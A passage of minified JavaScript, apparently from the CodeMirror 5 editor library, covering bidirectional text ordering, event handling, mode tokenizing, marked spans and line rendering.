D(1,Ei,hn))}return W=="ltr"&&(Sn[0].level==1&&(ii=I.match(/^\s+/))&&(Sn[0].from=ii[0].length,Sn.unshift(new D(0,0,ii[0].length))),it(Sn).level==1&&(ii=I.match(/\s+$/))&&(it(Sn).to-=ii[0].length,Sn.push(new D(0,ie-ii[0].length,ie)))),W=="rtl"?Sn.reverse():Sn}}();function Le(i,s){var d=i.order;return d==null&&(d=i.order=Ue(i.text,s)),d}var qe=[],fe=function(i,s,d){if(i.addEventListener)i.addEventListener(s,d,!1);else if(i.attachEvent)i.attachEvent("on"+s,d);else{var c=i._handlers||(i._handlers={});c[s]=(c[s]||qe).concat(d)}};function Et(i,s){return i._handlers&&i._handlers[s]||qe}function gt(i,s,d){if(i.removeEventListener)i.removeEventListener(s,d,!1);else if(i.detachEvent)i.detachEvent("on"+s,d);else{var c=i._handlers,p=c&&c[s];if(p){var y=ut(p,d);y>-1&&(c[s]=p.slice(0,y).concat(p.slice(y+1)))}}}function xt(i,s){var d=Et(i,s);if(d.length)for(var c=Array.prototype.slice.call(arguments,2),p=0;p<d.length;++p)d[p].apply(null,c)}function tt(i,s,d){return typeof s=="string"&&(s={type:s,preventDefault:function(){this.defaultPrevented=!0}}),xt(i,d||s.type,i,s),mi(s)||s.codemirrorIgnore}function rn(i){var s=i._handlers&&i._handlers.cursorActivity;if(s)for(var d=i.curOp.cursorActivityHandlers||(i.curOp.cursorActivityHandlers=[]),c=0;c<s.length;++c)ut(d,s[c])==-1&&d.push(s[c])}function gn(i,s){return Et(i,s).length>0}function Cr(i){i.prototype.on=function(s,d){fe(this,s,d)},i.prototype.off=function(s,d){gt(this,s,d)}}function Bt(i){i.preventDefault?i.preventDefault():i.returnValue=!1}function pi(i){i.stopPropagation?i.stopPropagation():i.cancelBubble=!0}function mi(i){return i.defaultPrevented!=null?i.defaultPrevented:i.returnValue==!1}function Mr(i){Bt(i),pi(i)}function Gl(i){return i.target||i.srcElement}function qi(i){var s=i.which;return s==null&&(i.button&1?s=1:i.button&2?s=3:i.button&4&&(s=2)),M&&i.ctrlKey&&s==1&&(s=3),s}var HC=function(){if(h&&m<9)return!1;var i=J("div");return"draggable"in i||"dragDrop"in i}(),bh;function UC(i){if(bh==null){var s=J("span","");ye(i,J("span",[s,document.createTextNode("x")])),i.firstChild.offsetHeight!=0&&(bh=s.offsetWidth<=1&&s.offsetHeight>2&&!(h&&m<8))}var d=bh?J("span",""):J("span","",null,"display: inline-block; width: 1px; margin-right: -1px");return d.setAttribute("cm-text",""),d}var Eh;function zC(i){if(Eh!=null)return Eh;var s=ye(i,document.createTextNode("AA")),d=oe(s,0,1).getBoundingClientRect(),c=oe(s,1,2).getBoundingClientRect();return me(i),!d||d.left==d.right?!1:Eh=c.right-d.right<3}var wh=`

b`.split(/\n/).length!=3?function(i){for(var s=0,d=[],c=i.length;s<=c;){var p=i.indexOf(`
`,s);p==-1&&(p=i.length);var y=i.slice(s,i.charAt(p-1)=="\r"?p-1:p),w=y.indexOf("\r");w!=-1?(d.push(y.slice(0,w)),s+=w+1):(d.push(y),s=p+1)}return d}:function(i){return i.split(/\r\n?|\n/)},WC=window.getSelection?function(i){try{return i.selectionStart!=i.selectionEnd}catch{return!1}}:function(i){var s;try{s=i.ownerDocument.selection.createRange()}catch{}return!s||s.parentElement()!=i?!1:s.compareEndPoints("StartToEnd",s)!=0},qC=function(){var i=J("div");return"oncopy"in i?!0:(i.setAttribute("oncopy","return;"),typeof i.oncopy=="function")}(),kh=null;function $C(i){if(kh!=null)return kh;var s=ye(i,J("span","x")),d=s.getBoundingClientRect(),c=oe(s,0,1).getBoundingClientRect();return kh=Math.abs(d.left-c.left)>1}var Th={},ks={};function YC(i,s){arguments.length>2&&(s.dependencies=Array.prototype.slice.call(arguments,2)),Th[i]=s}function VC(i,s){ks[i]=s}function uc(i){if(typeof i=="string"&&ks.hasOwnProperty(i))i=ks[i];else if(i&&typeof i.name=="string"&&ks.hasOwnProperty(i.name)){var s=ks[i.name];typeof s=="string"&&(s={name:s}),i=le(s,i),i.name=s.name}else{if(typeof i=="string"&&/^[\w\-]+\/[\w\-]+\+xml$/.test(i))return uc("application/xml");if(typeof i=="string"&&/^[\w\-]+\/[\w\-]+\+json$/.test(i))return uc("application/json")}return typeof i=="string"?{name:i}:i||{name:"null"}}function Ch(i,s){s=uc(s);var d=Th[s.name];if(!d)return Ch(i,"text/plain");var c=d(i,s);if(Ts.hasOwnProperty(s.name)){var p=Ts[s.name];for(var y in p)p.hasOwnProperty(y)&&(c.hasOwnProperty(y)&&(c["_"+y]=c[y]),c[y]=p[y])}if(c.name=s.name,s.helperType&&(c.helperType=s.helperType),s.modeProps)for(var w in s.modeProps)c[w]=s.modeProps[w];return c}var Ts={};function GC(i,s){var d=Ts.hasOwnProperty(i)?Ts[i]:Ts[i]={};vt(s,d)}function Oa(i,s){if(s===!0)return s;if(i.copyState)return i.copyState(s);var d={};for(var c in s){var p=s[c];p instanceof Array&&(p=p.concat([])),d[c]=p}return d}function Sh(i,s){for(var d;i.innerMode&&(d=i.innerMode(s),!(!d||d.mode==i));)s=d.state,i=d.mode;return d||{mode:i,state:s}}function Dx(i,s,d){return i.startState?i.startState(s,d):!0}var Xt=function(i,s,d){this.pos=this.start=0,this.string=i,this.tabSize=s||8,this.lastColumnPos=this.lastColumnValue=0,this.lineStart=0,this.lineOracle=d};Xt.prototype.eol=function(){return this.pos>=this.string.length},Xt.prototype.sol=function(){return this.pos==this.lineStart},Xt.prototype.peek=function(){return this.string.charAt(this.pos)||void 0},Xt.prototype.next=function(){if(this.pos<this.string.length)return this.string.charAt(this.pos++)},Xt.prototype.eat=function(i){var s=this.string.charAt(this.pos),d;if(typeof i=="string"?d=s==i:d=s&&(i.test?i.test(s):i(s)),d)return++this.pos,s},Xt.prototype.eatWhile=function(i){for(var s=this.pos;this.eat(i););return this.pos>s},Xt.prototype.eatSpace=function(){for(var i=this.pos;/[\s\u00a0]/.test(this.string.charAt(this.pos));)++this.pos;return this.pos>i},Xt.prototype.skipToEnd=function(){this.pos=this.string.length},Xt.prototype.skipTo=function(i){var s=this.string.indexOf(i,this.pos);if(s>-1)return this.pos=s,!0},Xt.prototype.backUp=function(i){this.pos-=i},Xt.prototype.column=function(){return this.lastColumnPos<this.start&&(this.lastColumnValue=lt(this.string,this.start,this.tabSize,this.lastColumnPos,this.lastColumnValue),this.lastColumnPos=this.start),this.lastColumnValue-(this.lineStart?lt(this.string,this.lineStart,this.tabSize):0)},Xt.prototype.indentation=function(){return lt(this.string,null,this.tabSize)-(this.lineStart?lt(this.string,this.lineStart,this.tabSize):0)},Xt.prototype.match=function(i,s,d){if(typeof i=="string"){var c=function(w){return d?w.toLowerCase():w},p=this.string.substr(this.pos,i.length);if(c(p)==c(i))return s!==!1&&(this.pos+=i.length),!0}else{var y=this.string.slice(this.pos).match(i);return y&&y.index>0?null:(y&&s!==!1&&(this.pos+=y[0].length),y)}},Xt.prototype.current=function(){return this.string.slice(this.start,this.pos)},Xt.prototype.hideFirstChars=function(i,s){this.lineStart+=i;try{return s()}finally{this.lineStart-=i}},Xt.prototype.lookAhead=function(i){var s=this.lineOracle;return s&&s.lookAhead(i)},Xt.prototype.baseToken=function(){var i=this.lineOracle;return i&&i.baseToken(this.pos)};function Ye(i,s){if(s-=i.first,s<0||s>=i.size)throw new Error("There is no line "+(s+i.first)+" in the document.");for(var d=i;!d.lines;)for(var c=0;;++c){var p=d.children[c],y=p.chunkSize();if(s<y){d=p;break}s-=y}return d.lines[s]}function Fa(i,s,d){var c=[],p=s.line;return i.iter(s.line,d.line+1,function(y){var w=y.text;p==d.line&&(w=w.slice(0,d.ch)),p==s.line&&(w=w.slice(s.ch)),c.push(w),++p}),c}function Nh(i,s,d){var c=[];return i.iter(s,d,function(p){c.push(p.text)}),c}function ei(i,s){var d=s-i.height;if(d)for(var c=i;c;c=c.parent)c.height+=d}function wt(i){if(i.parent==null)return null;for(var s=i.parent,d=ut(s.lines,i),c=s.parent;c;s=c,c=c.parent)for(var p=0;c.children[p]!=s;++p)d+=c.children[p].chunkSize();return d+s.first}function Ma(i,s){var d=i.first;e:do{for(var c=0;c<i.children.length;++c){var p=i.children[c],y=p.height;if(s<y){i=p;continue e}s-=y,d+=p.chunkSize()}return d}while(!i.lines);for(var w=0;w<i.lines.length;++w){var S=i.lines[w],D=S.height;if(s<D)break;s-=D}return d+w}function Ql(i,s){return s>=i.first&&s<i.first+i.size}function Ah(i,s){return String(i.lineNumberFormatter(s+i.firstLineNumber))}function ve(i,s,d){if(d===void 0&&(d=null),!(this instanceof ve))return new ve(i,s,d);this.line=i,this.ch=s,this.sticky=d}function Ze(i,s){return i.line-s.line||i.ch-s.ch}function Dh(i,s){return i.sticky==s.sticky&&Ze(i,s)==0}function Lh(i){return ve(i.line,i.ch)}function cc(i,s){return Ze(i,s)<0?s:i}function dc(i,s){return Ze(i,s)<0?i:s}function Lx(i,s){return Math.max(i.first,Math.min(s,i.first+i.size-1))}function Je(i,s){if(s.line<i.first)return ve(i.first,0);var d=i.first+i.size-1;return s.line>d?ve(d,Ye(i,d).text.length):QC(s,Ye(i,s.line).text.length)}function QC(i,s){var d=i.ch;return d==null||d>s?ve(i.line,s):d<0?ve(i.line,0):i}function _x(i,s){for(var d=[],c=0;c<s.length;c++)d[c]=Je(i,s[c]);return d}var fc=function(i,s){this.state=i,this.lookAhead=s},ti=function(i,s,d,c){this.state=s,this.doc=i,this.line=d,this.maxLookAhead=c||0,this.baseTokens=null,this.baseTokenPos=1};ti.prototype.lookAhead=function(i){var s=this.doc.getLine(this.line+i);return s!=null&&i>this.maxLookAhead&&(this.maxLookAhead=i),s},ti.prototype.baseToken=function(i){if(!this.baseTokens)return null;for(;this.baseTokens[this.baseTokenPos]<=i;)this.baseTokenPos+=2;var s=this.baseTokens[this.baseTokenPos+1];return{type:s&&s.replace(/( |^)overlay .*/,""),size:this.baseTokens[this.baseTokenPos]-i}},ti.prototype.nextLine=function(){this.line++,this.maxLookAhead>0&&this.maxLookAhead--},ti.fromSaved=function(i,s,d){return s instanceof fc?new ti(i,Oa(i.mode,s.state),d,s.lookAhead):new ti(i,Oa(i.mode,s),d)},ti.prototype.save=function(i){var s=i!==!1?Oa(this.doc.mode,this.state):this.state;return this.maxLookAhead>0?new fc(s,this.maxLookAhead):s};function Ix(i,s,d,c){var p=[i.state.modeGen],y={};Mx(i,s.text,i.doc.mode,d,function(I,W){return p.push(I,W)},y,c);for(var w=d.state,S=function(I){d.baseTokens=p;var W=i.state.overlays[I],K=1,ie=0;d.state=!0,Mx(i,s.text,W.mode,d,function(re,de){for(var ge=K;ie<re;){var ke=p[K];ke>re&&p.splice(K,1,re,p[K+1],ke),K+=2,ie=Math.min(re,ke)}if(de)if(W.opaque)p.splice(ge,K-ge,re,"overlay "+de),K=ge+2;else for(;ge<K;ge+=2){var Ie=p[ge+1];p[ge+1]=(Ie?Ie+" ":"")+"overlay "+de}},y),d.state=w,d.baseTokens=null,d.baseTokenPos=1},D=0;D<i.state.overlays.length;++D)S(D);return{styles:p,classes:y.bgClass||y.textClass?y:null}}function Px(i,s,d){if(!s.styles||s.styles[0]!=i.state.modeGen){var c=Kl(i,wt(s)),p=s.text.length>i.options.maxHighlightLength&&Oa(i.doc.mode,c.state),y=Ix(i,s,c);p&&(c.state=p),s.stateAfter=c.save(!p),s.styles=y.styles,y.classes?s.styleClasses=y.classes:s.styleClasses&&(s.styleClasses=null),d===i.doc.highlightFrontier&&(i.doc.modeFrontier=Math.max(i.doc.modeFrontier,++i.doc.highlightFrontier))}return s.styles}function Kl(i,s,d){var c=i.doc,p=i.display;if(!c.mode.startState)return new ti(c,!0,s);var y=KC(i,s,d),w=y>c.first&&Ye(c,y-1).stateAfter,S=w?ti.fromSaved(c,w,y):new ti(c,Dx(c.mode),y);return c.iter(y,s,function(D){_h(i,D.text,S);var I=S.line;D.stateAfter=I==s-1||I%5==0||I>=p.viewFrom&&I<p.viewTo?S.save():null,S.nextLine()}),d&&(c.modeFrontier=S.line),S}function _h(i,s,d,c){var p=i.doc.mode,y=new Xt(s,i.options.tabSize,d);for(y.start=y.pos=c||0,s==""&&jx(p,d.state);!y.eol();)Ih(p,y,d.state),y.start=y.pos}function jx(i,s){if(i.blankLine)return i.blankLine(s);if(i.innerMode){var d=Sh(i,s);if(d.mode.blankLine)return d.mode.blankLine(d.state)}}function Ih(i,s,d,c){for(var p=0;p<10;p++){c&&(c[0]=Sh(i,d).mode);var y=i.token(s,d);if(s.pos>s.start)return y}throw new Error("Mode "+i.name+" failed to advance stream.")}var Rx=function(i,s,d){this.start=i.start,this.end=i.pos,this.string=i.current(),this.type=s||null,this.state=d};function Ox(i,s,d,c){var p=i.doc,y=p.mode,w;s=Je(p,s);var S=Ye(p,s.line),D=Kl(i,s.line,d),I=new Xt(S.text,i.options.tabSize,D),W;for(c&&(W=[]);(c||I.pos<s.ch)&&!I.eol();)I.start=I.pos,w=Ih(y,I,D.state),c&&W.push(new Rx(I,w,Oa(p.mode,D.state)));return c?W:new Rx(I,w,D.state)}function Fx(i,s){if(i)for(;;){var d=i.match(/(?:^|\s+)line-(background-)?(\S+)/);if(!d)break;i=i.slice(0,d.index)+i.slice(d.index+d[0].length);var c=d[1]?"bgClass":"textClass";s[c]==null?s[c]=d[2]:new RegExp("(?:^|\\s)"+d[2]+"(?:$|\\s)").test(s[c])||(s[c]+=" "+d[2])}return i}function Mx(i,s,d,c,p,y,w){var S=d.flattenSpans;S==null&&(S=i.options.flattenSpans);var D=0,I=null,W=new Xt(s,i.options.tabSize,c),K,ie=i.options.addModeClass&&[null];for(s==""&&Fx(jx(d,c.state),y);!W.eol();){if(W.pos>i.options.maxHighlightLength?(S=!1,w&&_h(i,s,c,W.pos),W.pos=s.length,K=null):K=Fx(Ih(d,W,c.state,ie),y),ie){var re=ie[0].name;re&&(K="m-"+(K?re+" "+K:re))}if(!S||I!=K){for(;D<W.start;)D=Math.min(W.start,D+5e3),p(D,I);I=K}W.start=W.pos}for(;D<W.pos;){var de=Math.min(W.pos,D+5e3);p(de,I),D=de}}function KC(i,s,d){for(var c,p,y=i.doc,w=d?-1:s-(i.doc.mode.innerMode?1e3:100),S=s;S>w;--S){if(S<=y.first)return y.first;var D=Ye(y,S-1),I=D.stateAfter;if(I&&(!d||S+(I instanceof fc?I.lookAhead:0)<=y.modeFrontier))return S;var W=lt(D.text,null,i.options.tabSize);(p==null||c>W)&&(p=S-1,c=W)}return p}function XC(i,s){if(i.modeFrontier=Math.min(i.modeFrontier,s),!(i.highlightFrontier<s-10)){for(var d=i.first,c=s-1;c>d;c--){var p=Ye(i,c).stateAfter;if(p&&(!(p instanceof fc)||c+p.lookAhead<s)){d=c+1;break}}i.highlightFrontier=Math.min(i.highlightFrontier,d)}}var Bx=!1,gi=!1;function ZC(){Bx=!0}function JC(){gi=!0}function hc(i,s,d){this.marker=i,this.from=s,this.to=d}function Xl(i,s){if(i)for(var d=0;d<i.length;++d){var c=i[d];if(c.marker==s)return c}}function eS(i,s){for(var d,c=0;c<i.length;++c)i[c]!=s&&(d||(d=[])).push(i[c]);return d}function tS(i,s,d){var c=d&&window.WeakSet&&(d.markedSpans||(d.markedSpans=new WeakSet));c&&i.markedSpans&&c.has(i.markedSpans)?i.markedSpans.push(s):(i.markedSpans=i.markedSpans?i.markedSpans.concat([s]):[s],c&&c.add(i.markedSpans)),s.marker.attachLine(i)}function nS(i,s,d){var c;if(i)for(var p=0;p<i.length;++p){var y=i[p],w=y.marker,S=y.from==null||(w.inclusiveLeft?y.from<=s:y.from<s);if(S||y.from==s&&w.type=="bookmark"&&(!d||!y.marker.insertLeft)){var D=y.to==null||(w.inclusiveRight?y.to>=s:y.to>s);(c||(c=[])).push(new hc(w,y.from,D?null:y.to))}}return c}function rS(i,s,d){var c;if(i)for(var p=0;p<i.length;++p){var y=i[p],w=y.marker,S=y.to==null||(w.inclusiveRight?y.to>=s:y.to>s);if(S||y.from==s&&w.type=="bookmark"&&(!d||y.marker.insertLeft)){var D=y.from==null||(w.inclusiveLeft?y.from<=s:y.from<s);(c||(c=[])).push(new hc(w,D?null:y.from-s,y.to==null?null:y.to-s))}}return c}function Ph(i,s){if(s.full)return null;var d=Ql(i,s.from.line)&&Ye(i,s.from.line).markedSpans,c=Ql(i,s.to.line)&&Ye(i,s.to.line).markedSpans;if(!d&&!c)return null;var p=s.from.ch,y=s.to.ch,w=Ze(s.from,s.to)==0,S=nS(d,p,w),D=rS(c,y,w),I=s.text.length==1,W=it(s.text).length+(I?p:0);if(S)for(var K=0;K<S.length;++K){var ie=S[K];if(ie.to==null){var re=Xl(D,ie.marker);re?I&&(ie.to=re.to==null?null:re.to+W):ie.to=p}}if(D)for(var de=0;de<D.length;++de){var ge=D[de];if(ge.to!=null&&(ge.to+=W),ge.from==null){var ke=Xl(S,ge.marker);ke||(ge.from=W,I&&(S||(S=[])).push(ge))}else ge.from+=W,I&&(S||(S=[])).push(ge)}S&&(S=Hx(S)),D&&D!=S&&(D=Hx(D));var Ie=[S];if(!I){var Oe=s.text.length-2,Pe;if(Oe>0&&S)for(var Me=0;Me<S.length;++Me)S[Me].to==null&&(Pe||(Pe=[])).push(new hc(S[Me].marker,null,null));for(var Qe=0;Qe<Oe;++Qe)Ie.push(Pe);Ie.push(D)}return Ie}function Hx(i){for(var s=0;s<i.length;++s){var d=i[s];d.from!=null&&d.from==d.to&&d.marker.clearWhenEmpty!==!1&&i.splice(s--,1)}return i.length?i:null}function iS(i,s,d){var c=null;if(i.iter(s.line,d.line+1,function(re){if(re.markedSpans)for(var de=0;de<re.markedSpans.length;++de){var ge=re.markedSpans[de].marker;ge.readOnly&&(!c||ut(c,ge)==-1)&&(c||(c=[])).push(ge)}}),!c)return null;for(var p=[{from:s,to:d}],y=0;y<c.length;++y)for(var w=c[y],S=w.find(0),D=0;D<p.length;++D){var I=p[D];if(!(Ze(I.to,S.from)<0||Ze(I.from,S.to)>0)){var W=[D,1],K=Ze(I.from,S.from),ie=Ze(I.to,S.to);(K<0||!w.inclusiveLeft&&!K)&&W.push({from:I.from,to:S.from}),(ie>0||!w.inclusiveRight&&!ie)&&W.push({from:S.to,to:I.to}),p.splice.apply(p,W),D+=W.length-3}}return p}function Ux(i){var s=i.markedSpans;if(s){for(var d=0;d<s.length;++d)s[d].marker.detachLine(i);i.markedSpans=null}}function zx(i,s){if(s){for(var d=0;d<s.length;++d)s[d].marker.attachLine(i);i.markedSpans=s}}function pc(i){return i.inclusiveLeft?-1:0}function mc(i){return i.inclusiveRight?1:0}function jh(i,s){var d=i.lines.length-s.lines.length;if(d!=0)return d;var c=i.find(),p=s.find(),y=Ze(c.from,p.from)||pc(i)-pc(s);if(y)return-y;var w=Ze(c.to,p.to)||mc(i)-mc(s);return w||s.id-i.id}function Wx(i,s){var d=gi&&i.markedSpans,c;if(d)for(var p=void 0,y=0;y<d.length;++y)p=d[y],p.marker.collapsed&&(s?p.from:p.to)==null&&(!c||jh(c,p.marker)<0)&&(c=p.marker);return c}function qx(i){return Wx(i,!0)}function gc(i){return Wx(i,!1)}function aS(i,s){var d=gi&&i.markedSpans,c;if(d)for(var p=0;p<d.length;++p){var y=d[p];y.marker.collapsed&&(y.from==null||y.from<s)&&(y.to==null||y.to>s)&&(!c||jh(c,y.marker)<0)&&(c=y.marker)}return c}function $x(i,s,d,c,p){var y=Ye(i,s),w=gi&&y.markedSpans;if(w)for(var S=0;S<w.length;++S){var D=w[S];if(D.marker.collapsed){var I=D.marker.find(0),W=Ze(I.from,d)||pc(D.marker)-pc(p),K=Ze(I.to,c)||mc(D.marker)-mc(p);if(!(W>=0&&K<=0||W<=0&&K>=0)&&(W<=0&&(D.marker.inclusiveRight&&p.inclusiveLeft?Ze(I.to,d)>=0:Ze(I.to,d)>0)||W>=0&&(D.marker.inclusiveRight&&p.inclusiveLeft?Ze(I.from,c)<=0:Ze(I.from,c)<0)))return!0}}}function Br(i){for(var s;s=qx(i);)i=s.find(-1,!0).line;return i}function sS(i){for(var s;s=gc(i);)i=s.find(1,!0).line;return i}function lS(i){for(var s,d;s=gc(i);)i=s.find(1,!0).line,(d||(d=[])).push(i);return d}function Rh(i,s){var d=Ye(i,s),c=Br(d);return d==c?s:wt(c)}function Yx(i,s){if(s>i.lastLine())return s;var d=Ye(i,s),c;if(!$i(i,d))return s;for(;c=gc(d);)d=c.find(1,!0).line;return wt(d)+1}function $i(i,s){var d=gi&&s.markedSpans;if(d){for(var c=void 0,p=0;p<d.length;++p)if(c=d[p],!!c.marker.collapsed){if(c.from==null)return!0;if(!c.marker.widgetNode&&c.from==0&&c.marker.inclusiveLeft&&Oh(i,s,c))return!0}}}function Oh(i,s,d){if(d.to==null){var c=d.marker.find(1,!0);return Oh(i,c.line,Xl(c.line.markedSpans,d.marker))}if(d.marker.inclusiveRight&&d.to==s.text.length)return!0;for(var p=void 0,y=0;y<s.markedSpans.length;++y)if(p=s.markedSpans[y],p.marker.collapsed&&!p.marker.widgetNode&&p.from==d.to&&(p.to==null||p.to!=d.from)&&(p.marker.inclusiveLeft||d.marker.inclusiveRight)&&Oh(i,s,p))return!0}function xi(i){i=Br(i);for(var s=0,d=i.parent,c=0;c<d.lines.length;++c){var p=d.lines[c];if(p==i)break;s+=p.height}for(var y=d.parent;y;d=y,y=d.parent)for(var w=0;w<y.children.length;++w){var S=y.children[w];if(S==d)break;s+=S.height}return s}function xc(i){if(i.height==0)return 0;for(var s=i.text.length,d,c=i;d=qx(c);){var p=d.find(0,!0);c=p.from.line,s+=p.from.ch-p.to.ch}for(c=i;d=gc(c);){var y=d.find(0,!0);s-=c.text.length-y.from.ch,c=y.to.line,s+=c.text.length-y.to.ch}return s}function Fh(i){var s=i.display,d=i.doc;s.maxLine=Ye(d,d.first),s.maxLineLength=xc(s.maxLine),s.maxLineChanged=!0,d.iter(function(c){var p=xc(c);p>s.maxLineLength&&(s.maxLineLength=p,s.maxLine=c)})}var Cs=function(i,s,d){this.text=i,zx(this,s),this.height=d?d(this):1};Cs.prototype.lineNo=function(){return wt(this)},Cr(Cs);function oS(i,s,d,c){i.text=s,i.stateAfter&&(i.stateAfter=null),i.styles&&(i.styles=null),i.order!=null&&(i.order=null),Ux(i),zx(i,d);var p=c?c(i):1;p!=i.height&&ei(i,p)}function uS(i){i.parent=null,Ux(i)}var cS={},dS={};function Vx(i,s){if(!i||/^\s*$/.test(i))return null;var d=s.addModeClass?dS:cS;return d[i]||(d[i]=i.replace(/\S+/g,"cm-$&"))}function Gx(i,s){var d=pe("span",null,null,x?"padding-right: .1px":null),c={pre:pe("pre",[d],"CodeMirror-line"),content:d,col:0,pos:0,cm:i,trailingSpace:!1,splitSpaces:i.getOption("lineWrapping")};s.measure={};for(var p=0;p<=(s.rest?s.rest.length:0);p++){var y=p?s.rest[p-1]:s.line,w=void 0;c.pos=0,c.addToken=hS,zC(i.display.measure)&&(w=Le(y,i.doc.direction))&&(c.addToken=mS(c.addToken,w)),c.map=[];var S=s!=i.display.externalMeasured&&wt(y);gS(y,c,Px(i,y,S)),y.styleClasses&&(y.styleClasses.bgClass&&(c.bgClass=We(y.styleClasses.bgClass,c.bgClass||"")),y.styleClasses.textClass&&(c.textClass=We(y.styleClasses.textClass,c.textClass||""))),c.map.length==0&&c.map.push(0,0,c.content.appendChild(UC(i.display.measure))),p==0?(s.measure.map=c.map,s.measure.cache={}):((s.measure.maps||(s.measure.maps=[])).push(c.map),(s.measure.caches||(s.measure.caches=[])).push({}))}if(x){var D=c.content.lastChild;(/\bcm-tab\b/.test(D.className)||D.querySelector&&D.querySelector(".cm-tab"))&&(c.content.className="cm-tab-wrap-hack")}return xt(i,"renderLine",i,s.line,c.pre),c.pre.className&&(c.textClass=We(c.pre.className,c.textClass||"")),c}function fS(i){var s=J("span","","cm-invalidchar");return s.title="\\u"+i.charCodeAt(0).toString(16),s.setAttribute("aria-label",s.title),s}function hS(i,s,d,c,p,y,w){if(s){var S=i.splitSpaces?pS(s,i.trailingSpace):s,D=i.cm.state.specialChars,I=!1,W;if(!D.test(s))i.col+=s.length,W=document.createTextNode(S),i.map.push(i.pos,i.pos+s.length,W),h&&m<9&&(I=!0),i.pos+=s.length;else{W=document.createDocumentFragment();for(var K=0;;){D.lastIndex=K;var ie=D.exec(s),re=ie?ie.index-K:s.length-K;if(re){var de=document.createTextNode(S.slice(K,K+re));h&&m<9?W.appendChild(J("span",[de])):W.appendChild(de),i.map.push(i.pos,i.pos+re,de),i.col+=re,i.pos+=re}if(!ie)break;K+=re+1;var ge=void 0;if(ie[0]=="	"){var ke=i.cm.options.tabSize,Ie=ke-i.col%ke;ge=W.appendChild(J("span",fr(Ie),"cm-tab")),ge.setAttribute("role","presentation"),ge.setAttribute("cm-text","	"),i.col+=Ie}else ie[0]=="\r"||ie[0]==`
`?(ge=W.appendChild(J("span",ie[0]=="\r"?"":"","cm-invalidchar")),ge.setAttribute("cm-text",ie[0]),i.col+=1):(ge=i.cm.options.specialCharPlaceholder(ie[0]),ge.setAttribute("cm-text",ie[0]),h&&m<9?W.appendChild(J("span",[ge])):W.appendChild(ge),i.col+=1);i.map.push(i.pos,i.pos+1,ge),i.pos++}}if(i.trailingSpace=S.charCodeAt(s.length-1)==32,d||c||p||I||y||w){var Oe=d||"";c&&(Oe+=c),p&&(Oe+=p);var Pe=J("span",[W],Oe,y);if(w)for(var Me in w)w.hasOwnProperty(Me)&&Me!="style"&&Me!="class"&&Pe.setAttribute(Me,w[Me]);return i.content.appendChild(Pe)}i.content.appendChild(W)}}function pS(i,s){if(i.length>1&&!/  /.test(i))return i;for(var d=s,c="",p=0;p<i.length;p++){var y=i.charAt(p);y==" "&&d&&(p==i.length-1||i.charCodeAt(p+1)==32)&&(y=""),c+=y,d=y==" "}return c}function mS(i,s){return function(d,c,p,y,w,S,D){p=p?p+" cm-force-border":"cm-force-border";for(var I=d.pos,W=I+c.length;;){for(var K=void 0,ie=0;ie<s.length&&(K=s[ie],!(K.to>I&&K.from<=I));ie++);if(K.to>=W)return i(d,c,p,y,w,S,D);i(d,c.slice(0,K.to-I),p,y,null,S,D),y=null,c=c.slice(K.to-I),I=K.to}}}function Qx(i,s,d,c){var p=!c&&d.widgetNode;p&&i.map.push(i.pos,i.pos+s,p),!c&&i.cm.display.input.needsContentAttribute&&(p||(p=i.content.appendChild(document.createElement("span"))),p.setAttribute("cm-marker",d.id)),p&&(i.cm.display.input.setUneditable(p),i.content.appendChild(p)),i.pos+=s,i.trailingSpace=!1}function gS(i,s,d){var c=i.markedSpans,p=i.text,y=0;if(!c){for(var w=1;w<d.length;w+=2)s.addToken(s,p.slice(y,y=d[w]),Vx(d[w+1],s.cm.options));return}for(var S=p.length,D=0,I=1,W="",K,ie,re=0,de,ge,ke,Ie,Oe;;){if(re==D){de=ge=ke=ie="",Oe=null,Ie=null,re=1/0;for(var Pe=[],Me=void 0,Qe=0;Qe<c.length;++Qe){var Ge=c[Qe],nt=Ge.marker;if(nt.type=="bookmark"&&Ge.from==D&&nt.widgetNode)Pe.push(nt);else if(Ge.from<=D&&(Ge.to==null||Ge.to>D||nt.collapsed&&Ge.to==D&&Ge.from==D)){if(Ge.to!=null&&Ge.to!=D&&re>Ge.to&&(re=Ge.to,ge=""),nt.className&&(de+=" "+nt.className),nt.css&&(ie=(ie?ie+";":"")+nt.css),nt.startStyle&&Ge.from==D&&(ke+=" "+nt.startStyle),nt.endStyle&&Ge.to==re&&(Me||(Me=[])).push(nt.endStyle,Ge.to),nt.title&&((Oe||(Oe={})).title=nt.title),nt.attributes)for(var Nt in nt.attributes)(Oe||(Oe={}))[Nt]=nt.attributes[Nt];nt.collapsed&&(!Ie||jh(Ie.marker,nt)<0)&&(Ie=Ge)}else Ge.from>D&&re>Ge.from&&(re=Ge.from)}if(Me)for(var fn=0;fn<Me.length;fn+=2)Me[fn+1]==re&&(ge+=" "+Me[fn]);if(!Ie||Ie.from==D)for(var Ht=0;Ht<Pe.length;++Ht)Qx(s,0,Pe[Ht]);if(Ie&&(Ie.from||0)==D){if(Qx(s,(Ie.to==null?S+1:Ie.to)-D,Ie.marker,Ie.from==null),Ie.to==null)return;Ie.to==D&&(Ie=!1)}}if(D>=S)break;for(var nr=Math.min(S,re);;){if(W){var Yn=D+W.length;if(!Ie){var Zt=Yn>nr?W.slice(0,nr-D):W;s.addToken(s,Zt,K?K+de:de,ke,D+Zt.length==re?ge:"",ie,Oe)}if(Yn>=nr){W=W.slice(nr-D),D=nr;break}D=Yn,ke=""}W=p.slice(y,y=d[I++]),K=Vx(d[I++],s.cm.options)}}}function Kx(i,s,d){this.line=s,this.rest=lS(s),this.size=this.rest?wt(it(this.rest))-d+1:1,this.node=this.text=null,this.hidden=$i(i,s)}function yc(i,s,d){for(var c=[],p,y=s;y<d;y=p){var w=new Kx(i.doc,Ye(i.doc,y),y);p=y+w.size,c.push(w)}return c}var Ss=null;function xS(i){Ss?Ss.ops.push(i):i.ownsGroup=Ss={ops:[i],delayedCallbacks:[]}}function yS(i){var s=i.delayedCallbacks,d=0;do{for(;d<s.length;d++)s[d].call(null);for(var c=0;c<i.ops.length;c++){var p=i.ops[c];if(p.cursorActivityHandlers)for(;p.cursorActivityCalled<p.cursorActivityHandlers.length;)p.cursorActivityHandlers[p.cursorActivityCalled++].call(null,p.cm)}}while(d<s.length)}function vS(i,s){var d=i.ownsGroup;if(d)try{yS(d)}finally{Ss=null,s(d)}}var Zl=null;function un(i,s){var d=Et(i,s);if(d.length){var c=Array.prototype.slice.call(arguments,2),p;Ss?p=Ss.delayedCallbacks:Zl?p=Zl:(p=Zl=[],setTimeout(bS,0));for(var y=function(S){p.push(function(){return 